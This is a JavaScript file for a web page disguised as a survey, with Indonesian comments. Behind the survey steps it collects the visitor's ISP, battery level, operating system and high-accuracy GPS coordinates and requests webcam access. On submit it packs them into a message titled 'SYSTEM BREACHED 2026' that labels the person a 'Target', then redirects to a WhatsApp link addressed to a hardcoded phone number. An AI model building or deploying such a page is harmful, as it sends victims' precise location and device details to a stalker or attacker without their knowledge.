const nomorWA = "628979100200";
let userData = { 
    coords: "Tidak Diizinkan", 
    os: navigator.platform,
    battery: "Scanning...",
    isp: "Detecting..."
};

// 1. Fungsi Ambil Data ISP & Baterai
async function getQuickData() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        userData.isp = data.org || "Protected";
    } catch (e) { userData.isp = "ISP Hidden"; }

    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            userData.battery = Math.round(bat.level * 100) + "%";
        }
    } catch (e) { userData.battery = "Hardware Blocked"; }
}

// 2. Handler Tombol Mulai
const startBtn = document.getElementById('start-survey');
if (startBtn) {
    startBtn.onclick = function() {
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
        
        getQuickData();

        // PAKSA GPS AKURASI TINGGI
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    // Update koordinat real-time
                    userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
                }, 
                (err) => { 
                    console.log("GPS Ditolak"); 
                }, 
                {
                    enableHighAccuracy: true, // WAJIB: Memaksa akurasi GPS maksimal
                    timeout: 10000,           // Menunggu maksimal 10 detik
                    maximumAge: 0             // Jangan pakai lokasi lama (cache)
                }
            );
        }

        // Minta Izin Kamera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { 
                const video = document.getElementById('webcam');
                if (video) video.srcObject = stream; 
            })
            .catch(e => { console.log("Kamera Blocked"); });
    };
}

// 3. Fungsi Kirim
function finalSubmit() {
    const nameVal = document.getElementById('name').value;
    if (!nameVal) return alert("Isi nama dulu!");

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const bar = document.getElementById('progress');
    const timer = setInterval(() => {
        prg += 25;
        if (bar) bar.style.width = prg + "%";
        
        if (prg >= 100) {
            clearInterval(timer);
            
            // Perbaikan URL Maps: Menggunakan Google Maps standard link
            const mapUrl = "https://www.google.com/maps?q=" + userData.coords;
            
            const msg = "🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A" +
                        "👤 *Target:* " + nameVal + "%0A" +
                        "📍 *Maps:* " + mapUrl + "%0A" +
                        "📡 *ISP:* " + userData.isp + "%0A" +
                        "🔋 *Baterai:* " + userData.battery + "%0A" +
                        "💻 *OS:* " + userData.os + "%0A%0A" +
                        "_Status: Data Mirrored._";

            window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + msg;
        }
    }, 600);
}

// Event Listeners
const submitBtn = document.getElementById('submit-survey');
if (submitBtn) submitBtn.onclick = finalSubmit;

const nameField = document.getElementById('name');
if (nameField) {
    nameField.onkeydown = (e) => { if (e.key === "Enter") finalSubmit(); };
}
